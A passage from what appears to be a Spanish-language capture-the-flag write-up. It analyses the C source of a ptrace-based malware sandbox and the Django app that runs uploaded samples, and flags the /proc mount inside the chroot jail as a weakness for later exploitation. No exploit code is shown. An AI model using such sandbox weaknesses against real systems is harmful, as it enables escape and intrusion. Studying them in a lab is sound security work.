    <span class="mtk7 mtki">int</span> <span class="mtk1">result</span> <span class="mtk5">=</span> <span class="mtk8">mkdirat</span><span class="mtk1">(</span><span class="mtk1">jailsfd</span><span class="mtk1">,</span> <span class="mtk9 mtki">name</span><span class="mtk1">,</span> <span class="mtk5">0</span><span class="mtk6">771</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk1">result</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span> <span class="mtk5">&amp;&amp;</span> <span class="mtk8">errno</span> <span class="mtk5">!=</span> <span class="mtk8">EEXIST</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">DIE</span><span class="mtk1">(</span> <span class="mtk4">"Could</span> <span class="mtk4">not</span> <span class="mtk4">create</span> <span class="mtk4">the</span> <span class="mtk4">jail"</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>

    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">access</span><span class="mtk1">(</span><span class="mtk9 mtki">program</span><span class="mtk1">,</span> <span class="mtk8">F_OK</span><span class="mtk1">)</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"Program</span> <span class="mtk4">does</span> <span class="mtk4">not</span> <span class="mtk4">exist"</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>
    <span class="mtk8">chdir</span><span class="mtk1">(</span><span class="mtk4">"jails"</span><span class="mtk1">);</span>
    <span class="mtk8">chdir</span><span class="mtk1">(</span><span class="mtk9 mtki">name</span><span class="mtk1">);</span>
    <span class="mtk8">copy_libs</span><span class="mtk1">();</span>
    <span class="mtk8">do_namespaces</span><span class="mtk1">();</span>
    <span class="mtk8">copy</span><span class="mtk1">(</span><span class="mtk9 mtki">program</span><span class="mtk1">,</span> <span class="mtk4">"./userprog"</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">chroot</span><span class="mtk1">(</span><span class="mtk4">"."</span><span class="mtk1">))</span> <span class="mtk1">{</span><span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"Couldn't</span> <span class="mtk4">chroot</span> <span class="mtk4">#1"</span><span class="mtk1">);}</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">setgid</span><span class="mtk1">(</span><span class="mtk6">1001</span><span class="mtk1">))</span> <span class="mtk1">{</span><span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"SGID"</span><span class="mtk1">);}</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">setegid</span><span class="mtk1">(</span><span class="mtk6">1001</span><span class="mtk1">))</span> <span class="mtk1">{</span><span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"SEGID"</span><span class="mtk1">);}</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">setuid</span><span class="mtk1">(</span><span class="mtk6">1001</span><span class="mtk1">))</span> <span class="mtk1">{</span><span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"SUID"</span><span class="mtk1">);};</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">seteuid</span><span class="mtk1">(</span><span class="mtk6">1001</span><span class="mtk1">))</span> <span class="mtk1">{</span><span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"SEUID"</span><span class="mtk1">);};</span>
    <span class="mtk8">do_trace</span><span class="mtk1">();</span>
    <span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Otra función interesante es <code>copy_libs</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">copy_libs</span><span class="mtk1">()</span> <span class="mtk1">{</span>
    <span class="mtk7 mtki">char</span><span class="mtk5">*</span> <span class="mtk1">libs</span><span class="mtk5">[]</span> <span class="mtk5">=</span> <span class="mtk1">{</span><span class="mtk4">"libc.so.6"</span><span class="mtk1">,</span> <span class="mtk8">NULL</span><span class="mtk1">};</span>
    <span class="mtk7 mtki">char</span> <span class="mtk1">path</span><span class="mtk1">[</span><span class="mtk8">FILENAME_MAX</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk1">{</span><span class="mtk6">0</span><span class="mtk1">};</span>
    <span class="mtk7 mtki">char</span> <span class="mtk1">outpath</span><span class="mtk1">[</span><span class="mtk8">FILENAME_MAX</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk1">{</span><span class="mtk6">0</span><span class="mtk1">};</span>
    <span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"mkdir</span> <span class="mtk4">-p</span> <span class="mtk4">bin</span> <span class="mtk4">usr/lib/x86_64-linux-gnu</span> <span class="mtk4">usr/lib64;</span> <span class="mtk4">cp</span> <span class="mtk4">/bin/sh</span> <span class="mtk4">bin"</span><span class="mtk1">);</span>  
    <span class="mtk5">for</span> <span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk1">i</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span> <span class="mtk1">libs</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">]</span> <span class="mtk5">!=</span> <span class="mtk8">NULL</span><span class="mtk1">;</span> <span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">sprintf</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">,</span> <span class="mtk4">"/lib/x86_64-linux-gnu/</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">libs</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">]);</span>
        <span class="mtk3">//</span> <span class="mtk3">sprintf(path,</span> <span class="mtk3">"/lib/%s",</span> <span class="mtk3">libs[i]);</span>
        <span class="mtk8">sprintf</span><span class="mtk1">(</span><span class="mtk1">outpath</span><span class="mtk1">,</span> <span class="mtk4">"./usr/lib/</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">libs</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">]);</span>
        <span class="mtk8">copy</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">,</span> <span class="mtk1">outpath</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>
    <span class="mtk8">copy</span><span class="mtk1">(</span><span class="mtk4">"/lib64/ld-linux-x86-64.so.2"</span><span class="mtk1">,</span> <span class="mtk4">"./usr/lib64/ld-linux-x86-64.so.2"</span><span class="mtk1">);</span>
    <span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"ln</span> <span class="mtk4">-s</span> <span class="mtk4">usr/lib64</span> <span class="mtk4">lib64;</span> <span class="mtk4">ln</span> <span class="mtk4">-s</span> <span class="mtk4">usr/lib</span> <span class="mtk4">lib;</span> <span class="mtk4">chmod</span> <span class="mtk4">755</span> <span class="mtk4">-R</span> <span class="mtk4">usr</span> <span class="mtk4">bin"</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Que muestra que dentro de la jaula tenemos Glibc y <code>/bin/sh</code>.</p><p>Y otra función importante es <code>do_namespaces</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">do_namespaces</span><span class="mtk1">()</span> <span class="mtk1">{</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">unshare</span><span class="mtk1">(CLONE_NEWPID</span><span class="mtk5">|</span><span class="mtk1">CLONE_NEWNET)</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span><span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"Couldn't</span> <span class="mtk4">make</span> <span class="mtk4">namespaces"</span><span class="mtk1">);};</span>  
    <span class="mtk3">//</span> <span class="mtk3">Create</span> <span class="mtk3">pid-1</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">fork</span><span class="mtk1">()</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">6</span><span class="mtk1">);</span> <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">);}</span>
    <span class="mtk8">mkdir</span><span class="mtk1">(</span><span class="mtk4">"./proc"</span><span class="mtk1">,</span> <span class="mtk5">0</span><span class="mtk6">555</span><span class="mtk1">);</span>
    <span class="mtk8">mount</span><span class="mtk1">(</span><span class="mtk4">"/proc"</span><span class="mtk1">,</span> <span class="mtk4">"./proc"</span><span class="mtk1">,</span> <span class="mtk4">"proc"</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk8">NULL</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Esta realiza algo de lo que se puede abusar. Está montando el directorio <code>/proc</code> de un proceso hijo de <code>sandbox</code> en la jaula. Este hecho será útil para la explotación, ya que podremos leer información del proceso de <code>sandbox</code>.</p><p>Finalmente, la función <code>make_jail</code> crea el entorno de <code>chroot</code> y se cambia a dicho directorio, configura los permisos de usuario y grupo como UID/GID 1001 y finalmente llama a <code>do_trace</code> para monitorizar el comportamiento del <em>malware</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">do_trace</span><span class="mtk1">()</span> <span class="mtk1">{</span>
    <span class="mtk3">//</span> <span class="mtk3">We</span> <span class="mtk3">started</span> <span class="mtk3">with</span> <span class="mtk3">capabilities</span> <span class="mtk3">-</span> <span class="mtk3">we</span> <span class="mtk3">must</span> <span class="mtk3">reset</span> <span class="mtk3">the</span> <span class="mtk3">dumpable</span> <span class="mtk3">flag</span>  
    <span class="mtk3">//</span> <span class="mtk3">so</span> <span class="mtk3">that</span> <span class="mtk3">the</span> <span class="mtk3">child</span> <span class="mtk3">can</span> <span class="mtk3">be</span> <span class="mtk3">traced</span>
    <span class="mtk8">prctl</span><span class="mtk1">(PR_SET_DUMPABLE,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">);</span>
    <span class="mtk3">//</span> <span class="mtk3">Remove</span> <span class="mtk3">dangerous</span> <span class="mtk3">capabilities</span> <span class="mtk3">before</span> <span class="mtk3">the</span> <span class="mtk3">child</span> <span class="mtk3">starts</span>
    <span class="mtk7 mtki">struct</span> <span class="mtk8 mtku">user_cap_header_struct</span> <span class="mtk1">header</span><span class="mtk1">;</span>
    <span class="mtk7 mtki">struct</span> <span class="mtk8 mtku">user_cap_data_struct</span> <span class="mtk1">caps</span><span class="mtk1">;</span>
    <span class="mtk7 mtki">char</span> <span class="mtk1">pad</span><span class="mtk1">[</span><span class="mtk6">32</span><span class="mtk1">];</span>
    <span class="mtk1">header</span><span class="mtk1">.</span><span class="mtk1">version</span> <span class="mtk5">=</span> <span class="mtk1">_LINUX_CAPABILITY_VERSION_3;</span>
    <span class="mtk1">header</span><span class="mtk1">.</span><span class="mtk1">pid</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
    <span class="mtk1">caps</span><span class="mtk1">.</span><span class="mtk1">effective</span> <span class="mtk5">=</span> <span class="mtk1">caps</span><span class="mtk1">.</span><span class="mtk1">inheritable</span> <span class="mtk5">=</span> <span class="mtk1">caps</span><span class="mtk1">.</span><span class="mtk1">permitted</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
    <span class="mtk8">syscall</span><span class="mtk1">(SYS_capget,</span> <span class="mtk5">&amp;</span><span class="mtk1">header</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">caps</span><span class="mtk1">);</span>
    <span class="mtk1">caps</span><span class="mtk1">.</span><span class="mtk1">effective</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
    <span class="mtk1">caps</span><span class="mtk1">.</span><span class="mtk1">permitted</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
    <span class="mtk8">syscall</span><span class="mtk1">(SYS_capset,</span> <span class="mtk5">&amp;</span><span class="mtk1">header</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">caps</span><span class="mtk1">);</span>
    <span class="mtk7 mtki">int</span> <span class="mtk1">child</span> <span class="mtk5">=</span> <span class="mtk8">fork</span><span class="mtk1">();</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk1">child</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"Couldn't</span> <span class="mtk4">fork"</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk1">child</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">do_child</span><span class="mtk1">();</span>
    <span class="mtk1">}</span>
    <span class="mtk7 mtki">int</span> <span class="mtk1">killer</span> <span class="mtk5">=</span> <span class="mtk8">fork</span><span class="mtk1">();</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk1">killer</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"Couldn't</span> <span class="mtk4">fork</span> <span class="mtk4">(2)"</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk1">killer</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">do_killer</span><span class="mtk1">(</span><span class="mtk1">child</span><span class="mtk1">);</span>
    <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
        <span class="mtk8">do_log</span><span class="mtk1">(</span><span class="mtk1">child</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>
<span class="mtk1">}</span>
</code></pre></div><p>Esta función es algo larga, pero no es compleja. Lo que hace primero es dividir el proceso y llamar a <code>do_child</code>, que básicamente habilita que el binario con <em>malware</em> se pueda trazar con <code>ptrace</code> y lo ejecuta con <code>execve</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">do_child</span><span class="mtk1">()</span> <span class="mtk1">{</span>
    <span class="mtk3">//</span> <span class="mtk3">Prevent</span> <span class="mtk3">child</span> <span class="mtk3">process</span> <span class="mtk3">from</span> <span class="mtk3">escaping</span> <span class="mtk3">chroot</span>  
    <span class="mtk8">close</span><span class="mtk1">(</span><span class="mtk1">jailsfd</span><span class="mtk1">);</span>
    <span class="mtk8">prctl</span><span class="mtk1">(PR_SET_PDEATHSIG,</span> <span class="mtk8">SIGHUP</span><span class="mtk1">);</span>
    <span class="mtk8">ptrace</span><span class="mtk1">(PTRACE_TRACEME,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk8">NULL</span><span class="mtk1">,</span> <span class="mtk8">NULL</span><span class="mtk1">);</span>
    <span class="mtk7 mtki">char</span><span class="mtk5">*</span> <span class="mtk1">args</span><span class="mtk5">[]</span> <span class="mtk5">=</span> <span class="mtk1">{</span><span class="mtk8">NULL</span><span class="mtk1">};</span>
    <span class="mtk8">execve</span><span class="mtk1">(</span><span class="mtk4">"/userprog"</span><span class="mtk1">,</span> <span class="mtk1">args</span><span class="mtk1">,</span> <span class="mtk8">NULL</span><span class="mtk1">);</span>
    <span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"Couldn't</span> <span class="mtk4">execute</span> <span class="mtk4">user</span> <span class="mtk4">program"</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Después, divide el proceso de nuevo y mata la ejecución del <em>malware</em> tras 5 segundos con <code>do_killer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">do_killer</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">pid</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">5</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">kill</span><span class="mtk1">(</span><span class="mtk9 mtki">pid</span><span class="mtk1">,</span> <span class="mtk8">SIGKILL</span><span class="mtk1">)</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span><span class="mtk8">DIE</span><span class="mtk1">(</span><span class="mtk4">"Kill</span> <span class="mtk4">err"</span><span class="mtk1">);}</span>  
    <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Killed</span> <span class="mtk4">subprocess"</span><span class="mtk1">);</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Al mismo tiempo, la función llama a <code>do_log</code>, que es una función que utiliza <code>ptrace</code> para extraer todas las instrucciones <code>syscall</code> usadas por el <em>malware</em> (de hecho, en una función llamada <code>log_syscall</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">log_syscall</span><span class="mtk1">(</span><span class="mtk7 mtki">struct</span> <span class="mtk8 mtku">user_regs_struct</span> <span class="mtk9 mtki">regs</span><span class="mtk1">,</span> <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">long</span> <span class="mtk9 mtki">ret</span><span class="mtk1">)</span> <span class="mtk1">{</span>  
    <span class="mtk8 mtku">registers</span> <span class="mtk1">result</span><span class="mtk1">;</span>
    <span class="mtk1">result</span><span class="mtk1">.</span><span class="mtk1">rax</span> <span class="mtk5">=</span> <span class="mtk9 mtki">regs</span><span class="mtk1">.orig_rax;</span>
    <span class="mtk1">result</span><span class="mtk1">.</span><span class="mtk1">rdi</span> <span class="mtk5">=</span> <span class="mtk9 mtki">regs</span><span class="mtk1">.rdi;</span>
    <span class="mtk1">result</span><span class="mtk1">.</span><span class="mtk1">rsi</span> <span class="mtk5">=</span> <span class="mtk9 mtki">regs</span><span class="mtk1">.rsi;</span>
    <span class="mtk1">result</span><span class="mtk1">.</span><span class="mtk1">rdx</span> <span class="mtk5">=</span> <span class="mtk9 mtki">regs</span><span class="mtk1">.rdx;</span>
    <span class="mtk1">result</span><span class="mtk1">.</span><span class="mtk1">r10</span> <span class="mtk5">=</span> <span class="mtk9 mtki">regs</span><span class="mtk1">.r10;</span>
    <span class="mtk1">result</span><span class="mtk1">.</span><span class="mtk1">r8</span>  <span class="mtk5">=</span> <span class="mtk9 mtki">regs</span><span class="mtk1">.r8;</span>
    <span class="mtk1">result</span><span class="mtk1">.</span><span class="mtk1">r9</span>  <span class="mtk5">=</span> <span class="mtk9 mtki">regs</span><span class="mtk1">.r9;</span>
    <span class="mtk1">result</span><span class="mtk1">.</span><span class="mtk1">ret</span> <span class="mtk5">=</span> <span class="mtk9 mtki">ret</span><span class="mtk1">;</span>
    <span class="mtk7 mtki">int</span> <span class="mtk1">fd</span> <span class="mtk5">=</span> <span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/log"</span><span class="mtk1">,</span> <span class="mtk8">O_CREAT</span><span class="mtk5">|</span><span class="mtk8">O_RDWR</span><span class="mtk5">|</span><span class="mtk8">O_APPEND</span><span class="mtk1">,</span> <span class="mtk5">0</span><span class="mtk6">777</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk1">fd</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk5">return</span><span class="mtk1">;</span>
    <span class="mtk1">}</span>
    <span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">fd</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">result</span><span class="mtk1">,</span> <span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk8 mtku">registers</span><span class="mtk1">));</span>
    <span class="mtk8">close</span><span class="mtk1">(</span><span class="mtk1">fd</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Todas las instrucciones de <code>syscall</code> se añaden al archivo <code>log</code> que está dentro del entorno de <code>chroot</code>. Y este archivo <code>log</code> se analiza por el servidor web y se muestra como reporte.</p><h2 id="análisis-de-la-aplicación-web">Análisis de la aplicación web</h2><p>También nos proporcionan el código fuente de la aplicación web, que es una aplicación en Django (un <em>framework</em> de Python). Los proyectos de Django tienen muchos archivos, pero la mayoría son los que vienen por defecto.</p><p>Esta es la función que ejecuta el <em>malware</em> en la <em>sandbox</em> (<code>scanner/views.py</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">handle_file</span><span class="mtk1">(</span><span class="mtk9 mtki">file</span><span class="mtk1">):</span>
    <span class="mtk1">md5</span> <span class="mtk5">=</span> <span class="mtk8">calculate_file_md5</span>(<span class="mtk9 mtki">file</span><span class="mtk1">)</span>
    <span class="mtk1">path</span> <span class="mtk5">=</span> <span class="mtk7 mtki">f</span><span class="mtk4">"</span><span class="mtk6">{</span><span class="mtk1">settings</span><span class="mtk1">.</span><span class="mtk6">FILE_PATH}</span><span class="mtk4">/</span><span class="mtk6">{</span><span class="mtk1">md5</span><span class="mtk6">}</span><span class="mtk4">"</span>
    <span class="mtk5">with</span> <span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">,</span> <span class="mtk4">'wb+'</span><span class="mtk1">)</span> <span class="mtk5">as</span> <span class="mtk1">f</span><span class="mtk1">:</span>
        <span class="mtk5">for</span> <span class="mtk1">chunk</span> <span class="mtk5">in</span> <span class="mtk9 mtki">file</span><span class="mtk1">.chunks():</span>
            <span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">chunk</span><span class="mtk1">)</span>
    <span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"cd</span> <span class="mtk6">{</span><span class="mtk1">settings</span><span class="mtk1">.</span><span class="mtk6">SBX_PATH}</span><span class="mtk4">;</span> <span class="mtk4">./sandbox</span> <span class="mtk6">{</span><span class="mtk1">path</span><span class="mtk6">}</span> <span class="mtk6">{</span><span class="mtk1">md5</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">)</span>  
    <span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">remove</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">)</span>
    <span class="mtk5">return</span> <span class="mtk1">md5</span>
</code></pre></div><p>Podríamos pensar en injección de comandos debido a la interpolación de <em>strings</em>, pero ninguna de las variables son externas, por lo que no podemos controlarlas.</p><p>Dentro de <code>viewer/views.py</code> se ven dos funciones:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">view_file</span><span class="mtk1">(</span><span class="mtk9 mtki">request</span><span class="mtk1">,</span> <span class="mtk9 mtki">md5</span><span class="mtk1">:</span> <span class="mtk8 mtku">str</span><span class="mtk1">):</span>
    <span class="mtk1">path</span> <span class="mtk5">=</span> <span class="mtk7 mtki">f</span><span class="mtk4">"</span><span class="mtk6">{</span><span class="mtk1">settings</span><span class="mtk1">.</span><span class="mtk6">SBX_PATH}</span><span class="mtk4">/jails/</span><span class="mtk6">{</span><span class="mtk9 mtki">md5</span><span class="mtk6">}</span><span class="mtk4">"</span>
    <span class="mtk5">if</span> <span class="mtk5">not</span> <span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8 mtku">path</span><span class="mtk1">.</span><span class="mtk8">exists</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">):</span>
        <span class="mtk5">raise</span> <span class="mtk8 mtku">Http404</span><span class="mtk1">(</span><span class="mtk4">"A</span> <span class="mtk4">sample</span> <span class="mtk4">with</span> <span class="mtk4">this</span> <span class="mtk4">hash</span> <span class="mtk4">has</span> <span class="mtk4">not</span> <span class="mtk4">been</span> <span class="mtk4">uploaded."</span><span class="mtk1">)</span>
    <span class="mtk1">logfile</span> <span class="mtk5">=</span> <span class="mtk7 mtki">f</span><span class="mtk4">"</span><span class="mtk6">{</span><span class="mtk1">path</span><span class="mtk6">}</span><span class="mtk4">/log"</span>
    <span class="mtk5">if</span> <span class="mtk5">not</span> <span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8 mtku">path</span><span class="mtk1">.</span><span class="mtk8">exists</span><span class="mtk1">(</span><span class="mtk1">logfile</span><span class="mtk1">):</span>
        <span class="mtk5">return</span> <span class="mtk8 mtku">HttpResponse</span><span class="mtk1">(</span><span class="mtk4">"There</span> <span class="mtk4">was</span> <span class="mtk4">an</span> <span class="mtk4">error</span> <span class="mtk4">logging</span> <span class="mtk4">this</span> <span class="mtk4">application"</span><span class="mtk1">)</span>
    <span class="mtk1">syscalls</span> <span class="mtk5">=</span> <span class="mtk1">[</span><span class="mtk1">call</span><span class="mtk1">.render()</span> <span class="mtk5">for</span> <span class="mtk1">call</span> <span class="mtk5">in</span> <span class="mtk8">parse_log</span><span class="mtk1">(</span><span class="mtk1">logfile</span><span class="mtk1">)]</span>
    <span class="mtk1">ignore</span> <span class="mtk5">=</span> <span class="mtk8 mtku">list</span><span class="mtk1">(</span><span class="mtk8 mtku">filter</span><span class="mtk1">(</span><span class="mtk7 mtki">lambda</span> <span class="mtk9 mtki">call</span><span class="mtk1">:</span> <span class="mtk9 mtki">call</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span> <span class="mtk5">==</span> <span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Ignore</span><span class="mtk1">,</span> <span class="mtk1">syscalls</span><span class="mtk1">))</span>
    <span class="mtk1">low</span> <span class="mtk5">=</span> <span class="mtk8 mtku">list</span><span class="mtk1">(</span><span class="mtk8 mtku">filter</span><span class="mtk1">(</span><span class="mtk7 mtki">lambda</span> <span class="mtk9 mtki">call</span><span class="mtk1">:</span> <span class="mtk9 mtki">call</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span> <span class="mtk5">==</span> <span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Low</span><span class="mtk1">,</span> <span class="mtk1">syscalls</span><span class="mtk1">))</span>
    <span class="mtk1">med</span> <span class="mtk5">=</span> <span class="mtk8 mtku">list</span><span class="mtk1">(</span><span class="mtk8 mtku">filter</span><span class="mtk1">(</span><span class="mtk7 mtki">lambda</span> <span class="mtk9 mtki">call</span><span class="mtk1">:</span> <span class="mtk9 mtki">call</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span> <span class="mtk5">==</span> <span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk1">syscalls</span><span class="mtk1">))</span>
    <span class="mtk1">high</span> <span class="mtk5">=</span> <span class="mtk8 mtku">list</span><span class="mtk1">(</span><span class="mtk8 mtku">filter</span><span class="mtk1">(</span><span class="mtk7 mtki">lambda</span> <span class="mtk9 mtki">call</span><span class="mtk1">:</span> <span class="mtk9 mtki">call</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span> <span class="mtk5">==</span> <span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk1">syscalls</span><span class="mtk1">))</span>
